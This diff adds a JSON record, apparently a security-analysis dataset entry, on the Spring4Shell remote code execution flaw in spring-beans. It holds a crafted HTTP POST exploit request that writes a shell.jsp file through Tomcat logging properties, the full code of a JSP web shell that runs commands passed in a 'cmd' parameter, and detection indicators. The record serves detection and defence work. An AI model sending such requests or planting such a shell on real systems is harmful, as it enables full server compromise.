@@ -1,0 +1,92 @@
+{
+  "package_info": {
+    "package_name": "spring-beans",
+    "package_manager": "Maven",
+    "package_versions": "5.3.0-5.3.17, 5.2.0-5.2.19 (prior to 5.3.18 and 5.2.20)",
+    "why_malicious": "The affected versions of the Spring Framework's spring-beans component contain a vulnerability (Spring4Shell/SpringShell, CVE-2022-22965) that allows remote code execution (RCE) under certain conditions. Attackers can exploit this flaw to upload and execute arbitrary code (such as web shells) on vulnerable servers, leading to full system compromise."
+  },
+  "malicious_snippets": [
+    {
+      "snippet_id": "snippet_1",
+      "execution_context": {
+        "trigger": "runtime (HTTP request with crafted payload)",
+        "file_location": "Java controller/request mapping (POJO binding via DataBinder)",
+        "required_permissions": [
+          "network",
+          "filesystem"
+        ]
+      },
+      "code_snippet": "POST /vulnerable-endpoint HTTP/1.1\nHost: victim.com\nContent-Type: application/x-www-form-urlencoded\n\nclass.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bscript%7D&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&class.module.classLoader.resources.context.parent.pipeline.first.prefix=shell&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=",
+      "code_language": "HTTP/Java (DataBinder exploitation via HTTP request)",
+      "code_behavior": "At runtime, the attacker sends a specially crafted HTTP POST request that manipulates the DataBinder to change Tomcat's logging configuration, causing a malicious JSP web shell to be written to the webroot. This enables remote code execution via subsequent HTTP requests to the web shell.",
+      "malice_analysis": {
+        "why_suspicious": "This code leverages HTTP parameter binding to overwrite internal server configuration, resulting in arbitrary file write and code execution.",
+        "violated_expectations": "Normal request parameter binding should not allow modification of server internals or writing executable files to the webroot.",
+        "similar_legitimate_use": "Legitimate use of DataBinder is for mapping user input to POJOs, not for altering server configuration.",
+        "key_indicators": [
+          "Manipulation of classLoader and pipeline properties via HTTP parameters",
+          "Writing .jsp files to webroot",
+          "Pattern and suffix parameters used to inject executable code"
+        ]
+      }
+    },
+    {
+      "snippet_id": "snippet_2",
+      "execution_context": {
+        "trigger": "runtime (after successful exploitation of snippet_1)",
+        "file_location": "webapps/ROOT/shell.jsp (web shell written by attacker)",
+        "required_permissions": [
+          "filesystem",
+          "network"
+        ]
+      },
+      "code_snippet": "<% if (request.getParameter(\"cmd\") != null) { Process p = Runtime.getRuntime().exec(request.getParameter(\"cmd\")); java.io.InputStream in = p.getInputStream(); int a = -1; while((a=in.read())!=-1) out.print((char)a); } %>",
+      "code_language": "JSP (Java Server Pages)",
+      "code_behavior": "At runtime, the attacker accesses the uploaded shell.jsp file and provides a 'cmd' parameter, which is executed on the server. The output of the command is returned in the HTTP response, enabling arbitrary command execution.",
+      "malice_analysis": {
+        "why_suspicious": "This code executes arbitrary system commands based on user input and returns the output, a classic web shell behavior.",
+        "violated_expectations": "JSP files in production should not allow arbitrary command execution via HTTP parameters.",
+        "similar_legitimate_use": "No legitimate use; this is a textbook web shell.",
+        "key_indicators": [
+          "Use of Runtime.getRuntime().exec() with user-supplied input",
+          "Returning command output in HTTP response",
+          "Presence of shell.jsp in webroot"
+        ]
+      }
+    }
+  ],
+  "attack_chain": [
+    {
+      "step": 1,
+      "action": "Attacker sends a crafted HTTP POST request to a vulnerable endpoint, exploiting DataBinder to overwrite Tomcat logging configuration and write a malicious JSP web shell to the webroot.",
+      "implemented_by": [
+        "snippet_1"
+      ],
+      "leads_to": "Web shell is written to the server, enabling further exploitation."
+    },
+    {
+      "step": 2,
+      "action": "Attacker accesses the uploaded shell.jsp web shell and sends commands via the 'cmd' parameter, achieving remote code execution on the server.",
+      "implemented_by": [
+        "snippet_2"
+      ],
+      "leads_to": "Full remote code execution and potential system compromise."
+    }
+  ],
+  "detection_knowledge": {
+    "behavioral_signatures": [
+      "HTTP requests with parameters targeting classLoader, pipeline, or logging configuration",
+      "Unexpected creation of .jsp files in webroot directories",
+      "Execution of system commands via web-accessible JSP files"
+    ],
+    "file_indicators": [
+      "webapps/ROOT/shell.jsp",
+      "webapps/ROOT/*.jsp created outside of deployment process"
+    ],
+    "network_indicators": [
+      "Unusual POST requests with suspicious parameter names (class.module.classLoader.resources.context.parent.pipeline.*)",
+      "Subsequent HTTP requests to newly created .jsp files"
+    ],
+    "how_to_detect": "Monitor HTTP traffic for requests containing parameters that manipulate classLoader or pipeline properties. Watch for the creation of new .jsp files in webroot directories, especially outside of normal deployment cycles. Flag any web-accessible JSP files that execute system commands based on user input. Use file integrity monitoring and web server logs to detect suspicious file writes and access patterns."
+  }
+}
